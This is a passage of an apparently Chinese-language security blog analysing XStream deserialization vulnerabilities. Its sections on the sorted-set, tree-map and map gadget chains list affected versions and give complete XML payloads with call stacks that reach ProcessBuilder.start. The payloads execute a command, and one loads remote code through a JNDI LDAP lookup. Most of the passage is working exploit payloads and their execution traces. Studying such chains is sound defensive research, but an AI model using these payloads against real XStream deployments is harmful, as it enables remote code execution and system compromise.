class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sorted-set</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">type</span>&gt;</span>test<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">&#x27;javax.swing.MultiUIDefaults&#x27;</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">hashtable</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">loadFactor</span>&gt;</span>0.75<span class="tag">&lt;/<span class="name">loadFactor</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">threshold</span>&gt;</span>525<span class="tag">&lt;/<span class="name">threshold</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">int</span>&gt;</span>700<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">int</span>&gt;</span>0<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">hashtable</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">javax.swing.UIDefaults</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">defaultLocale</span>&gt;</span>zh_CN<span class="tag">&lt;/<span class="name">defaultLocale</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">resourceCache</span>/&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">javax.swing.UIDefaults</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">javax.swing.MultiUIDefaults</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">tables</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">javax.swing.UIDefaults</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">hashtable</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">loadFactor</span>&gt;</span>0.75<span class="tag">&lt;/<span class="name">loadFactor</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">threshold</span>&gt;</span>525<span class="tag">&lt;/<span class="name">threshold</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">int</span>&gt;</span>700<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">int</span>&gt;</span>1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">string</span>&gt;</span>lazyValue<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">javax.swing.UIDefaults_-ProxyLazyValue</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">className</span>&gt;</span>javax.naming.InitialContext<span class="tag">&lt;/<span class="name">className</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">methodName</span>&gt;</span>doLookup<span class="tag">&lt;/<span class="name">methodName</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">args</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>ldap://127.0.0.1:1389/Basic/Command/calc<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">args</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">javax.swing.UIDefaults_-ProxyLazyValue</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">hashtable</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">javax.swing.UIDefaults</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">defaultLocale</span> <span class="attr">reference</span>=<span class="string">&#x27;../../../../../../../javax.swing.UIDefaults/default/defaultLocale&#x27;</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">resourceCache</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">javax.swing.UIDefaults</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">javax.swing.UIDefaults</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">tables</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">javax.swing.MultiUIDefaults</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">type</span>&gt;</span>test<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.xpath.internal.objects.XString&#x27;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">m__obj</span> <span class="attr">class</span>=<span class="string">&#x27;string&#x27;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">m__obj</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">sorted-set</span>&gt;</span></span><br></pre></td></tr></table></figure><p>函数调用栈</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">start:1007, ProcessBuilder (java.lang)</span><br><span class="line">exec:620, Runtime (java.lang)</span><br><span class="line">exec:485, Runtime (java.lang)</span><br><span class="line">&lt;init&gt;:-1, Exploit_etYbcClocgwl</span><br><span class="line">newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:62, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:422, Constructor (java.lang.reflect)</span><br><span class="line">newInstance:442, Class (java.lang)</span><br><span class="line">getObjectFactoryFromReference:163, NamingManager (javax.naming.spi)</span><br><span class="line">getObjectInstance:189, DirectoryManager (javax.naming.spi)</span><br><span class="line">c_lookup:1085, LdapCtx (com.sun.jndi.ldap)</span><br><span class="line">p_lookup:542, ComponentContext (com.sun.jndi.toolkit.ctx)</span><br><span class="line">lookup:177, PartialCompositeContext (com.sun.jndi.toolkit.ctx)</span><br><span class="line">lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)</span><br><span class="line">lookup:94, ldapURLContext (com.sun.jndi.url.ldap)</span><br><span class="line">lookup:417, InitialContext (javax.naming)</span><br><span class="line">doLookup:290, InitialContext (javax.naming)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect) [2]</span><br><span class="line">invoke:497, Method (java.lang.reflect)</span><br><span class="line">invoke:71, Trampoline (sun.reflect.misc)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect) [1]</span><br><span class="line">invoke:497, Method (java.lang.reflect)</span><br><span class="line">invoke:275, MethodUtil (sun.reflect.misc)</span><br><span class="line">run:1107, UIDefaults$ProxyLazyValue$1 (javax.swing)</span><br><span class="line">doPrivileged:-1, AccessController (java.security)</span><br><span class="line">createValue:1086, UIDefaults$ProxyLazyValue (javax.swing)</span><br><span class="line">getFromHashtable:216, UIDefaults (javax.swing)</span><br><span class="line">get:161, UIDefaults (javax.swing)</span><br><span class="line">get:64, MultiUIDefaults (javax.swing)</span><br><span class="line">toString:197, MultiUIDefaults (javax.swing)</span><br><span class="line">equals:392, XString (com.sun.org.apache.xpath.internal.objects)</span><br><span class="line">compareTo:441, Rdn$RdnEntry (javax.naming.ldap)</span><br><span class="line">compareTo:420, Rdn$RdnEntry (javax.naming.ldap)</span><br><span class="line">put:568, TreeMap (java.util)</span><br><span class="line">putAll:281, AbstractMap (java.util)</span><br><span class="line">putAll:327, TreeMap (java.util)</span><br><span class="line">populateTreeMap:122, TreeMapConverter (com.thoughtworks.xstream.converters.collections)</span><br><span class="line">unmarshal:94, TreeSetConverter (com.thoughtworks.xstream.converters.collections)</span><br><span class="line">convert:72, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convert:65, AbstractReferenceUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:66, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:50, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">start:134, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshal:32, AbstractTreeMarshallingStrategy (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshal:1157, XStream (com.thoughtworks.xstream)</span><br><span class="line">unmarshal:1141, XStream (com.thoughtworks.xstream)</span><br><span class="line">fromXML:1021, XStream (com.thoughtworks.xstream)</span><br><span class="line">main:20, Vul (POC.sortedSet)</span><br></pre></td></tr></table></figure><h2 id="tree-map"><a href="#tree-map" class="headerlink" title="tree-map"></a>tree-map</h2><h3 id="影响范围-3"><a href="#影响范围-3" class="headerlink" title="影响范围"></a>影响范围</h3><p>XStream &#x3D;&#x3D; (1.4.0, 1.4.6]  &#x2F; 1.4.10</p><h3 id="版本说明-3"><a href="#版本说明-3" class="headerlink" title="版本说明"></a>版本说明</h3><ul><li>1.3.x 会直接报错，没有 compartor 属性</li><li>1.4.7 - 1.4.9 、1.4.11 都是对  EventHandler 这个handler类进行黑名单过滤。</li></ul><h3 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>这个同样是根标签解析到 TreeMap 这个 Converter，然后触发 compareTo，链子没变，但是覆盖版本更广了，POC如下</p><figure class="highlight xml"><figcaption><span>title:"poc.xml"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--affected_version: XStream == (, 1.4.6] /  1.4.10--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tree-map</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">interface</span>&gt;</span>java.lang.Comparable<span class="tag">&lt;/<span class="name">interface</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">handler</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.EventHandler&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">target</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>calc<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span>&gt;</span>start<span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">handler</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>good<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tree-map</span>&gt;</span></span><br></pre></td></tr></table></figure><p>函数调用栈</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">invoke:275, MethodUtil (sun.reflect.misc)</span><br><span class="line">invokeInternal:482, EventHandler (java.beans)</span><br><span class="line">access$000:279, EventHandler (java.beans)</span><br><span class="line">run:430, EventHandler$1 (java.beans)</span><br><span class="line">doPrivileged:-1, AccessController (java.security)</span><br><span class="line">invoke:428, EventHandler (java.beans)</span><br><span class="line">compareTo:-1, $Proxy0 (com.sun.proxy)</span><br><span class="line">compare:1290, TreeMap (java.util)</span><br><span class="line">put:538, TreeMap (java.util)</span><br><span class="line">putAll:281, AbstractMap (java.util)</span><br><span class="line">putAll:327, TreeMap (java.util)</span><br><span class="line">populateTreeMap:122, TreeMapConverter (com.thoughtworks.xstream.converters.collections)</span><br><span class="line">unmarshal:79, TreeMapConverter (com.thoughtworks.xstream.converters.collections)</span><br><span class="line">convert:72, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convert:65, AbstractReferenceUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:66, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:50, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">start:134, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshal:32, AbstractTreeMarshallingStrategy (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshal:1156, XStream (com.thoughtworks.xstream)</span><br><span class="line">unmarshal:1140, XStream (com.thoughtworks.xstream)</span><br><span class="line">fromXML:1020, XStream (com.thoughtworks.xstream)</span><br><span class="line">main:18, Vul (POC.treeMap)</span><br></pre></td></tr></table></figure><h2 id="map"><a href="#map" class="headerlink" title="map"></a>map</h2><h3 id="影响范围-4"><a href="#影响范围-4" class="headerlink" title="影响范围"></a>影响范围</h3><p>XStream &lt;&#x3D; 1.4.13</p><h3 id="版本说明-4"><a href="#版本说明-4" class="headerlink" title="版本说明"></a>版本说明</h3><ul><li>1.3.x 会直接报错</li><li>1.4.14 以后存在 对 <code>ProcessBuilder</code>的黑名单，在 <code>com.thoughtworks.xstream.XStream#setupSecurity</code>里<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1e7cb1f79ec65924fb6ccfb3b646cac4.png"></li></ul><h3 id="漏洞分析-4"><a href="#漏洞分析-4" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>漏洞本质：利用 <code>MapConverter#putCurrentEntryIntoMap</code> 函数为入口，一直调用到<code>ImageIO$ContainsFilter#filter</code> </p><figure class="highlight xml"><figcaption><span>title:"poc.xml"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">map</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">flags</span>&gt;</span>0<span class="tag">&lt;/<span class="name">flags</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&#x27;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">contentType</span>&gt;</span>text/plain<span class="tag">&lt;/<span class="name">contentType</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">is</span> <span class="attr">class</span>=<span class="string">&#x27;java.io.SequenceInputStream&#x27;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">e</span> <span class="attr">class</span>=<span class="string">&#x27;javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator&#x27;</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">iterator</span> <span class="attr">class</span>=<span class="string">&#x27;javax.imageio.spi.FilterIterator&#x27;</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">iter</span> <span class="attr">class</span>=<span class="string">&#x27;java.util.ArrayList$Itr&#x27;</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">cursor</span>&gt;</span>0<span class="tag">&lt;/<span class="name">cursor</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">lastRet</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">lastRet</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">expectedModCount</span>&gt;</span>1<span class="tag">&lt;/<span class="name">expectedModCount</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">outer-class</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">java.lang.ProcessBuilder</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">                                                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>calc<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--                                                    &lt;string&gt;-a&lt;/string&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--                                                    &lt;string&gt;Calculator&lt;/string&gt;--&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;/<span class="name">java.lang.ProcessBuilder</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;/<span class="name">outer-class</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">iter</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">filter</span> <span class="attr">class</span>=<span class="string">&#x27;javax.imageio.ImageIO$ContainsFilter&#x27;</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">method</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">class</span>&gt;</span>java.lang.ProcessBuilder<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">name</span>&gt;</span>start<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">parameter-types</span>/&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;/<span class="name">method</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">name</span>&gt;</span>start<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">next</span>/&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">iterator</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">type</span>&gt;</span>KEYS<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">e</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">in</span> <span class="attr">class</span>=<span class="string">&#x27;java.io.ByteArrayInputStream&#x27;</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">buf</span>&gt;</span><span class="tag">&lt;/<span class="name">buf</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">pos</span>&gt;</span>0<span class="tag">&lt;/<span class="name">pos</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">mark</span>&gt;</span>0<span class="tag">&lt;/<span class="name">mark</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">count</span>&gt;</span>0<span class="tag">&lt;/<span class="name">count</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">in</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">is</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">consumed</span>&gt;</span>false<span class="tag">&lt;/<span class="name">consumed</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">transferFlavors</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">dataLen</span>&gt;</span>0<span class="tag">&lt;/<span class="name">dataLen</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>test<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>一个 entry 大概是这样的形式，第一个是key，第二个是value。 poc 把 payload 放在 key 那里了。</p><figure class="highlight xml"><figcaption><span>title:"Demo"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">map</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>key<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>value<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br></pre></td></tr></table></figure><p>source点：<code>MapConverter#putCurrentEntryIntoMap</code>函数，内部调用了 target.put(key, value)，target是最根部的map标签（HashMap类型），key是payload（NativeString类型），value是test字符串。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1181eab16f39102d05ebca7a2f2c17ba.png"></p><p>然后 HashMap#put(key, value) 最终是可以调到 key#hashCode 的，也就进入了 NativeString#hashCode，也就是 xml 的第二个标签，后续每个调用都有标签的对应，无非是把反射赋值改为xml属性赋值。</p><p>sink点：<code>ImageIO$ContainsFilter#filter</code> 可以实现反射调用函数，参数可控。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/75101bb192bb662eed365839be01ff9d.png"></p><p>函数调用栈</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">start:1007, ProcessBuilder (java.lang)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:497, Method (java.lang.reflect)</span><br><span class="line">filter:613, ImageIO$ContainsFilter (javax.imageio)</span><br><span class="line">advance:821, FilterIterator (javax.imageio.spi)</span><br><span class="line">next:839, FilterIterator (javax.imageio.spi)</span><br><span class="line">nextElement:153, MultiUIDefaults$MultiUIDefaultsEnumerator (javax.swing)</span><br><span class="line">nextStream:110, SequenceInputStream (java.io)</span><br><span class="line">read:211, SequenceInputStream (java.io)</span><br><span class="line">readFrom:65, ByteArrayOutputStreamEx 